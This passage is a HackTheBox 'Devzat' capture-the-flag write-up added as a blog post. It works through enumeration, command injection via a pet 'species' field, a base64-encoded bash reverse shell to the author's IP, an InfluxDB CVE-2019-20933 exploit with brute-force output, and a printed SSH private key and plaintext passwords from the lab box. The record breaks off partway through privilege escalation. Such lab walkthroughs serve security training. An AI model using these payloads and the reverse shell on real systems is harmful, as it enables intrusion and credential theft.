@@ -1,0 +1,846 @@
+---
+title: Hackthebox Devzat Writeup
+slug: hackthebox-devzat-writeup
+description: Hackthebox release new machine called devzat, in this machine we need to analyze too much code and find a species field directly executed without any filter inside exec command and we use that to get rev shell after that finding a service on port 8086 and this service running InfluxDB http admin use that to get catherine user password and after that find two different zip after extract that it's similar to each other but new functionality is added inside that use that functionality to get root id_rsa.
+date: 2021-10-21
+image: hackthebox-devzat-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ nmap -sC -sV -oA nmap/result 10.10.11.118
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 01:08 CDT
+Nmap scan report for 10.10.11.118
+Host is up (0.078s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
+|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
+|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://devzat.htb/
+8000/tcp open  ssh     (protocol 2.0)
+| fingerprint-strings:
+|   NULL:
+|_    SSH-2.0-Go
+| ssh-hostkey:
+|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.91%I=7%D=10/18%Time=616D0F58%P=x86_64-pc-linux-gnu%r(NSF:ULL,C,"SSH-2.0-Go
+");
+Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.69 seconds
+```
+
+There are three ports open `22:ssh,80:http,8000:again ssh`
+
+And we also see in the `nmap` scan that `80` port will redirect us to `devzat.htb`. let's quickly add that in our `/etc/hosts` file.
+
+```js
+cat vim /etc/hosts
+
+127.0.0.1       localhost
+127.0.1.1       parrot
+
+#custom
+10.10.11.118    devzat.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+## Port-80
+
+It's a `simple` web page with some `description`. i think it's talking about `chat` app.
+
+<FixTheImageURL src='web.png' slug='hackthebox-devzat-writeup' />
+
+After `scrolling` down i find a way to `interact` with chat app.
+
+<FixTheImageURL src='web1.png' slug='hackthebox-devzat-writeup' />
+
+Now we are `connect` with the chat app i try `/help` that give me `/commands` to execute.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ ssh -l dedsec devzat.htb -p 8000
+devbot: Run /help to get help!
+reee: it's "/help"
+reee: for commands "/commands"
+devbot: dedsec has left the chat
+devbot: dedsec stayed on for 1 minute
+devbot: dedsec has joined the chat
+reee: ?
+devbot: dedsec has left the chat
+devbot: dedsec has joined the chat
+devbot: dedsec has left the chat
+devbot: dedsec has joined the chat
+devbot: dedsec has left the chat
+devbot: dedsec has joined the chat
+dedsec: help
+devbot: Run /help to get help!
+devbot: dedsec has left the chat
+Welcome to the chat. There is one more user
+devbot: dedsec has joined the chat
+dedsec: /help
+[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat
+[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.
+[SYSTEM]
+[SYSTEM] Interesting features:
+[SYSTEM] • Many, many commands. Run /commands.
+[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.
+[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.
+[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.
+[SYSTEM] • Direct messages! Send a quick DM using =user or stay in DMs by running /room @user.
+[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.
+[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang to start new games.
+[SYSTEM] • Emoji replacements! (like on Slack and Discord)
+[SYSTEM]
+[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.
+[SYSTEM]
+[SYSTEM] Made by Ishan Goel with feature ideas from friends.
+[SYSTEM] Thanks to Caleb Denio for lending his server!
+[SYSTEM]
+[SYSTEM] For a list of commands run
+[SYSTEM] ┃ /commands
+dedsec:
+```
+
+`/commands` argument give me bunch of `commands` to execute i try some command but didn't get `anything` useful.
+
+```js
+dedsec: /commands
+[SYSTEM] Commands
+[SYSTEM] clear - Clears your terminal
+[SYSTEM] message - Sends a private message to someone
+[SYSTEM] users - Gets a list of the active users
+[SYSTEM] all - Gets a list of all users who has ever connected
+[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
+[SYSTEM] bell - Toggles notifications when you get pinged
+[SYSTEM] room - Changes which room you are currently in
+[SYSTEM] id - Gets the hashed IP of the user
+[SYSTEM] commands - Get a list of commands
+[SYSTEM] nick - Change your display name
+[SYSTEM] color - Change your display name color
+[SYSTEM] timezone - Change how you view time
+[SYSTEM] emojis - Get a list of emojis you can use
+[SYSTEM] help - Get generic info about the server
+[SYSTEM] tictactoe - Play tictactoe
+[SYSTEM] hangman - Play hangman
+[SYSTEM] shrug - Drops a shrug emoji
+[SYSTEM] ascii-art - Bob ross with text
+[SYSTEM] example-code - Hello world!
+dedsec: users
+dedsec: /users
+[SYSTEM] [reee dedsec]
+dedsec: /all
+[SYSTEM] [AAAAAAAAAAAAAAAAAAAAAAAAAAA dedsec pat reee sherrif user xyz]
+dedsec:
+```
+
+After that i `decide` to do virtual host `discovery` with gobuster.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ gobuster vhost -u http://devzat.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -r -t 80
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://devzat.htb
+[+] Method:       GET
+[+] Threads:      80
+[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2021/10/18 01:30:39 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: pets.devzat.htb (Status: 200) [Size: 510]
+===============================================================
+2021/10/18 01:34:41 Finished
+===============================================================
+```
+
+Found a `vhost` called `pets.devzat.htb` let's quickly add that in `/etc/hosts` file.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       parrot
+
+#custom
+10.10.11.118    devzat.htb pets.devzat.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+When i go to `pets.devzat.htb` i see that it's a pet `inventory` were we add our `pets` name.
+
+<FixTheImageURL src='web2.png' slug='hackthebox-devzat-writeup' />
+
+I try to add `special` character in pet name and when i `submit` that the server said `exit-status-1`
+
+<FixTheImageURL src='web3.png' slug='hackthebox-devzat-writeup' />
+
+I try many `special` character but server always said `exit-status-1`. after that i run wfuzz and found a `interesting` directory called `.git`
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ wfuzz -u http://pets.devzat.htb/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt -c --hh 510 -t 80
+    /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://pets.devzat.htb/FUZZ
+Total requests: 43003
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000021:   301        2 L      3 W        40 Ch       "css"
+000001767:   301        2 L      3 W        42 Ch       "build"
+000004659:   403        9 L      28 W       280 Ch      "server-status"
+000005919:   301        2 L      3 W        41 Ch       ".git"
+
+Total time: 71.69910
+Processed Requests: 43003
+Filtered Requests: 42999
+Requests/sec.: 599.7703
+```
+
+Let's dump the `.git` directory with the `help` of this tool.
+
+Link : https://github.com/arthaud/git-dumper
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[/opt/git-dumper]
+└──╼ [★]$ python3 git_dumper.py http://pets.devzat.htb/.git dump/
+```
+
+I think it's a `source` code of `pets` application.
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-devzat-writeup' />
+
+When i analyze the code of `main.go` file i found a `venerable` function that directly `execute` the species name without any `filter`. we can use that to get `rev` shell.
+
+<FixTheImageURL src='cmd1.png' slug='hackthebox-devzat-writeup' />
+
+First let's `capture` the request in `burp`.
+
+<FixTheImageURL src='web4.png' slug='hackthebox-devzat-writeup' />
+
+So the req is `working` fine.
+
+<FixTheImageURL src='burp.png' slug='hackthebox-devzat-writeup' />
+
+Let's try with `simple` command first with `ping` ourself for that let's setup the `tcpdump`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ tcpdump icmp -i tun0
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+```
+
+```js
+{
+    "name":"Anonymous",
+    "species":"cat;ping -c 1 10.10.14.116"
+}
+```
+
+Let's send the `req` and check the `tcpdump`.
+
+<FixTheImageURL src='burp1.png' slug='hackthebox-devzat-writeup' />
+
+And we got the `req` let's get the `rev shell` quickly.
+
+<FixTheImageURL src='cmd2.png' slug='hackthebox-devzat-writeup' />
+
+Change the `ip` and you `good` to go.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ echo "bash -i >& /dev/tcp/10.10.14.116/9001 0>&1" | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTYvOTAwMSAwPiYxCg==
+```
+
+```js
+{
+    "name":"Anonymous",
+    "species":"cat;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTYvOTAwMSAwPiYxCg== | base64 -d | bash"
+}
+```
+
+Before `sending` the req start your `netcat` listner.
+
+After `sending` the req we didn't get the `responce` back let's check the `netcat` listner.
+
+<FixTheImageURL src='burp2.png' slug='hackthebox-devzat-writeup' />
+
+And we got the `shell`.
+
+<FixTheImageURL src='cmd3.png' slug='hackthebox-devzat-writeup' />
+
+And we got the `id_rsa` of user `patrick`.
+
+```js
+patrick@devzat:~/.ssh$ ls
+authorized_keys  id_rsa  known_hosts
+patrick@devzat:~/.ssh$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+patrick@devzat:~/.ssh$ id
+uid=1000(patrick) gid=1000(patrick) groups=1000(patrick)
+patrick@devzat:~/.ssh$
+```
+
+let's ssh in with the `patrick id_rsa`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ vim id_rsa_patrick
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ chmod 600 id_rsa_patrick
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ ssh -i id_rsa_patrick patrick@10.10.11.118
+The authenticity of host '10.10.11.118 (10.10.11.118)' can't be established.
+ECDSA key fingerprint is SHA256:0rsaIiCqLD9ELa+kVyYB1zoufcsvYtVR7QKaYzUyC0Q.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.118' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
+
+    * Documentation:  https://help.ubuntu.com
+    * Management:     https://landscape.canonical.com
+    * Support:        https://ubuntu.com/advantage
+
+    System information as of Mon 18 Oct 2021 07:04:22 AM UTC
+
+    System load:  0.0               Processes:                313
+    Usage of /:   61.9% of 7.81GB   Users logged in:          1
+    Memory usage: 40%               IPv4 address for docker0: 172.17.0.1
+    Swap usage:   0%                IPv4 address for eth0:    10.10.11.118
+
+
+107 updates can be applied immediately.
+33 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Oct 18 04:52:07 2021 from 10.10.17.54
+patrick@devzat:~$
+```
+
+Now let's run `LinPEAS`.
+
+And we see a `service` running on port `8086`.
+
+<FixTheImageURL src='cmd4.png' slug='hackthebox-devzat-writeup' />
+
+let's transfer `chisel` in machine for `port-forwarding` so we can enumerate that `port`.
+
+<FixTheImageURL src='cmd5.png' slug='hackthebox-devzat-writeup' />
+
+## Local Machine
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[/opt/chisel/linux]
+└──╼ [★]$ ./chisel server -p 8080 --reverse
+2021/10/18 23:47:02 server: Reverse tunnelling enabled
+2021/10/18 23:47:02 server: Fingerprint //cDBn4ynCsEa8aJ7X/dOtf1kjfz4oNogD+g2nPg0Bs=
+2021/10/18 23:47:02 server: Listening on http://0.0.0.0:8080
+```
+
+## Target Machine
+
+```js
+patrick@devzat:/tmp$ chmod +x chisel
+patrick@devzat:/tmp$ ./chisel client 10.10.14.116:8080 R:8086:127.0.0.1:8086
+2021/10/19 04:47:35 client: Connecting to ws://10.10.14.116:8080
+2021/10/19 04:47:36 client: Connected (Latency 82.996449ms)
+```
+
+<FixTheImageURL src='cmd6.png' slug='hackthebox-devzat-writeup' />
+
+After accessing that port on `browser` it's said `404 page not found` and we see it's using `php` with `laravel` framework.
+
+<FixTheImageURL src='web5.png' slug='hackthebox-devzat-writeup' />
+
+After that i run `nmap` to check what `service` it's running.
+
+And we see it's running `InfluxDB`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ nmap -sC -sV 127.0.0.1 -p 8086
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-19 00:32 CDT
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000045s latency).
+
+PORT     STATE SERVICE VERSION
+8086/tcp open  http    InfluxDB http admin 1.7.5
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds
+```
+
+After some `google` i found an `exploit` for that.
+
+Link : https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git
+Cloning into 'InfluxDB-Exploit-CVE-2019-20933'...
+remote: Enumerating objects: 20, done.
+remote: Counting objects: 100% (20/20), done.
+remote: Compressing objects: 100% (20/20), done.
+remote: Total 20 (delta 5), reused 4 (delta 0), pack-reused 0
+Receiving objects: 100% (20/20), 5.97 KiB | 2.98 MiB/s, done.
+Resolving deltas: 100% (5/5), done.
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat]
+└──╼ [★]$ cd InfluxDB-Exploit-CVE-2019-20933/
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat/InfluxDB-Exploit-CVE-2019-20933]
+└──╼ [★]$ pip install -r requirements.txt
+```
+
+Now let's run the `exploit`
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat/InfluxDB-Exploit-CVE-2019-20933]
+└──╼ [★]$ python __main__.py
+    _____        __ _            _____  ____    ______            _       _ _
+    |_   _|      / _| |          |  __ |  _   |  ____|          | |     (_) |
+    | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_
+    | | | '_ |  _| | | |  / / |  | |  _ <  |  __|  / / '_ | |/ _ | | __|
+    _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_
+    |_____|_| |_|_| |_|__,_/_/______/|____/  |______/_/_ .__/|_|___/|_|__|
+                                                            | |
+                                                            |_|
+CVE-2019-20933
+
+Insert ip host (default localhost):
+Insert port (default 8086):
+Insert influxdb user (wordlist path to bruteforce username): /usr/share/SecLists/Usernames/Names/names.txt
+
+Start username bruteforce
+[x] aaliyah
+[x] aaren
+[x] aarika
+[x] aaron
+[x] aartjan
+[x] aarushi
+[x] abagael
+[x] abagail
+[x] abahri
+[x] abbas
+[x] abbe
+[x] abbey
+[x] abbi
+[x] abbie
+[x] abby
+[x] abbye
+[x] abdalla
+[x] abdallah
+[x] abdul
+[x] abdullah
+[x] abe
+[x] abel
+[x] abi
+[x] abia
+[x] abigael
+[x] abigail
+[x] abigale
+[x] abra
+[x] abraham
+[x] abram
+[x] abree
+[x] abrianna
+[x] abriel
+[x] abrielle
+[x] abu
+[x] aby
+[x] acacia
+[x] access
+[x] accounting
+[x] ace
+[x] achal
+[x] achamma
+[x] action
+[x] ada
+[x] adah
+[x] adair
+[x] adalia
+[x] adaline
+[x] adalyn
+[x] adam
+[x] adan
+[x] adara
+[x] adda
+[x] addi
+[x] addia
+[x] addie
+[x] addilyn
+[x] addison
+[x] addons
+[x] addy
+[x] ade
+[x] adel
+[x] adela
+[x] adelaida
+[x] adelaide
+[x] adele
+[x] adelene
+[x] adelheid
+[x] adelia
+[x] adelice
+[x] adelina
+[x] adelind
+[x] adeline
+[x] adella
+[x] adelle
+[x] adelynn
+[x] aden
+[x] adena
+[x] adeniyi
+[x] adey
+[x] adi
+[x] adiana
+[x] adie
+[x] adina
+[x] aditya
+[v] admin
+
+Host vulnerable !!!
+Databases list:
+
+1) devzat
+2) _internal
+
+Insert database name (exit to close): devzat
+[devzat] Insert query (exit to change db): show tables;
+{
+    "error": "error parsing query: found tables, expected CONTINUOUS, DATABASES, DIAGNOSTICS, FIELD, GRANTS, MEASUREMENT, MEASUREMENTS, QUERIES, RETENTION, SERIES, SHARD, SHARDS, STATS, SUBSCRIPTIONS, TAG, USERS at line 1, char 6"
+}
+[devzat] Insert query (exit to change db): SELECT * FROM "user"
+{
+    "results": [
+        {
+            "series": [
+                {
+                    "columns": [
+                        "time",
+                        "enabled",
+                        "password",
+                        "username"
+                    ],
+                    "name": "user",
+                    "values": [
+                        [
+                            "2021-06-22T20:04:16.313965493Z",
+                            false,
+                            "WillyWonka2021",
+                            "wilhelm"
+                        ],
+                        [
+                            "2021-06-22T20:04:16.320782034Z",
+                            true,
+                            "woBeeYareedahc7Oogeephies7Aiseci",
+                            "catherine"
+                        ],
+                        [
+                            "2021-06-22T20:04:16.996682002Z",
+                            true,
+                            "RoyalQueenBee$",
+                            "charles"
+                        ]
+                    ]
+                }
+            ],
+            "statement_id": 0
+        }
+    ]
+}
+```
+
+And we get the `catherine` user password `woBeeYareedahc7Oogeephies7Aiseci`
+
+Let's change our user to `catherine` and get the `user.txt`.
+
+```js
+patrick@devzat:/tmp$ su catherine
+Password: woBeeYareedahc7Oogeephies7Aiseci
+catherine@devzat:/tmp$ cd ~
+catherine@devzat:~$ cat user.txt
+79626dad0d4983adb965413bbf0521da
+catherine@devzat:~$
+```
+
+## Privilege escalation
+
+Let's run `LinPEAS` again.
+
+And we got two `backup` files **devzat-main** & **devzat-dev**.
+
+<FixTheImageURL src='cmd7.png' slug='hackthebox-devzat-writeup' />
+
+python3 is installed inside that `box` so let's use that to `transfer` both files in our `local` machine.
+
+<FixTheImageURL src='cmd8.png' slug='hackthebox-devzat-writeup' />
+
+Now let's `unzip` both files.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat/www]
+└──╼ [★]$ unzip devzat-main.zip; unzip devzat-dev.zip
+Archive:  devzat-main.zip
+    creating: main/
+    inflating: main/go.mod
+    extracting: main/.gitignore
+    inflating: main/util.go
+    inflating: main/eastereggs.go
+    inflating: main/README.md
+    inflating: main/games.go
+    inflating: main/colors.go
+    extracting: main/log.txt
+    inflating: main/commands.go
+    inflating: main/start.sh
+    inflating: main/devchat.go
+    inflating: main/LICENSE
+    inflating: main/commandhandler.go
+    inflating: main/art.txt
+    inflating: main/go.sum
+    inflating: main/allusers.json
+Archive:  devzat-dev.zip
+    creating: dev/
+    inflating: dev/go.mod
+    extracting: dev/.gitignore
+    inflating: dev/util.go
+    inflating: dev/testfile.txt
+    inflating: dev/eastereggs.go
+    inflating: dev/README.md
+    inflating: dev/games.go
+    inflating: dev/colors.go
+    extracting: dev/log.txt
+    inflating: dev/commands.go
+    inflating: dev/start.sh
+    inflating: dev/devchat.go
+    inflating: dev/LICENSE
+    inflating: dev/commandhandler.go
+    inflating: dev/art.txt
+    inflating: dev/go.sum
+    extracting: dev/allusers.json
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat/www]
+└──╼ [★]$ ls
+dev  devzat-dev.zip  devzat-main.zip  main
+```
+
+And we got two folder called `dev` and `main`. inside both `folders` all files `look` similar.
+
+I check all `files` with `diff command` to check what's the changes inside the files and i got `interesting` file called `commands.go`.
+
+```js
+┌───[us-free-1]─[10.10.14.116]─[root@parrot]─[~/Desktop/HTB/Devzat/www]
+└──╼ [★]$ ls -al dev;ls -al main
+total 116
+drwxr-xr-x 1 root root   320 Jul 16 01:36 .
+drwxr-xr-x 1 root root    72 Oct 21 01:05 ..
+-rw-r--r-- 1 root root     3 Jul 16 01:37 allusers.json
+-rw-r--r-- 1 root root  3235 Jun 22 13:35 art.txt
+-rw-r--r-- 1 root root  4436 Jun 22 13:35 colors.go
+-rw-r--r-- 1 root root  1944 Jun 22 13:35 commandhandler.go
+-rw-r--r-- 1 root root 13827 Jun 22 13:35 commands.go
+-rw-r--r-- 1 root root 11341 Jul 16 01:56 devchat.go
+-rw-r--r-- 1 root root   648 Jun 22 13:35 eastereggs.go
+-rw-r--r-- 1 root root   990 Jun 22 13:35 games.go
+-rw-r--r-- 1 root root    22 Jun 22 13:35 .gitignore
+-rw-r--r-- 1 root root  1114 Jun 22 13:35 go.mod
+-rw-r--r-- 1 root root 13983 Jun 22 13:35 go.sum
+-rw-r--r-- 1 root root  1067 Jun 22 13:35 LICENSE
+-rw-r--r-- 1 root root     1 Jul 16 01:37 log.txt
+-rw-r--r-- 1 root root  5630 Jun 22 13:35 README.md
+-rwxr-xr-x 1 root root   123 Jun 22 13:35 start.sh
+-rw-r--r-- 1 root root   356 Jun 22 13:35 testfile.txt
+-rw-r--r-- 1 root root  8715 Jun 22 13:35 util.go
+total 112
+drwxr-xr-x 1 root root   296 Jul 16 01:01 .
+drwxr-xr-x 1 root root    72 Oct 21 01:05 ..
+-rw-r--r-- 1 root root   108 Jul 16 01:38 allusers.json
+-rw-r--r-- 1 root root  3235 Jun 22 13:35 art.txt
+-rw-r--r-- 1 root root  4436 Jun 22 13:35 colors.go
+-rw-r--r-- 1 root root  1944 Jun 22 13:35 commandhandler.go
+-rw-r--r-- 1 root root 12403 Jun 22 13:35 commands.go
+-rw-r--r-- 1 root root 11332 Jul 16 01:54 devchat.go
+-rw-r--r-- 1 root root   648 Jun 22 13:35 eastereggs.go
+-rw-r--r-- 1 root root   990 Jun 22 13:35 games.go
+-rw-r--r-- 1 root root    22 Jun 22 13:35 .gitignore
+-rw-r--r-- 1 root root  1114 Jun 22 13:35 go.mod
+-rw-r--r-- 1 root root 13983 Jun 22 13:35 go.sum
+-rw-r--r-- 1 root root  1067 Jun 22 13:35 LICENSE
+-rw-r--r-- 1 root root     1 Jul 16 01:37 log.txt
